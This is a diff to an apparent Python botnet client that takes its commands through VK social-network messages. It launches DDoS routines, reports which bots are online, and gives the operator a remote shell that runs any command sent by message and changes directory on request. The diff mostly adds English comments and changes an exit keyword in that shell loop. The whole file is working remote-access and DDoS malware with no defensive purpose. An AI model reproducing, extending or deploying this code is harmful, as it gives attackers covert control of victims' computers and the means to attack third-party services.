@@ -3,7 +3,6 @@ from SecondDDoS import secondDDoS
 from POSTGET import message
 from CMD import cmd
 from vk_api import VkApi
-from vk_api.utils import get_random_id
 from vk_api.longpoll import VkLongPoll, VkEventType
 from getpass import getuser
 import os
@@ -44,27 +43,27 @@ for event in longpoll.listen():
                         secondDDoS() # Run secondDDoS - without notification
                     elif event.text == 'online':
                         message(name + ' - онлайн') # Show all bots online
-                    elif event.text == name + ' cmd':
+                    elif event.text == name + ' cmd': # Turns on CMD on selected bot
                         message(cmd("cd"))
                         message('Для выхода введите "Выход"')
                         for event in longpoll.listen():  # Wait for next command
                             if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
-                                if event.text != "Выход":
-                                    command = '"' + event.text + '"'
-                                    try:
-                                        if (event.text == "cd"):
-                                            message("Введите директорию. Для выхода введите выход")
+                                if event.text != "Выход": # If message != Выход
+                                    command = '"' + event.text + '"' # String that format text
+                                    try: # If by doing command we have errors program write report to user
+                                        if (event.text == "cd"): # If you want to change directory - you write cd
+                                            message('Введите директорию. Для выхода введите "Назад"')
                                             for event in longpoll.listen():  # Wait for next command
                                                 if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
-                                                    if event.text != "Выход":
-                                                        os.chdir(event.text)
+                                                    if event.text != "Назад":
+                                                        os.chdir(event.text) # Change directory to message directory
                                                         break
                                                     else:
-                                                        message("Выходим...")
+                                                        message("Выходим...") # Else exit and break cycle
                                                         break
                                         message(cmd(command))
                                     except:
-                                        message("Произошла ошибка. Попробуйте еще раз...")
+                                        message("Произошла ошибка. Попробуйте еще раз...") # Crush report
                                 else:
-                                    message("Выходим...")
+                                    message("Выходим...") # If message == "Выход"
                                     break
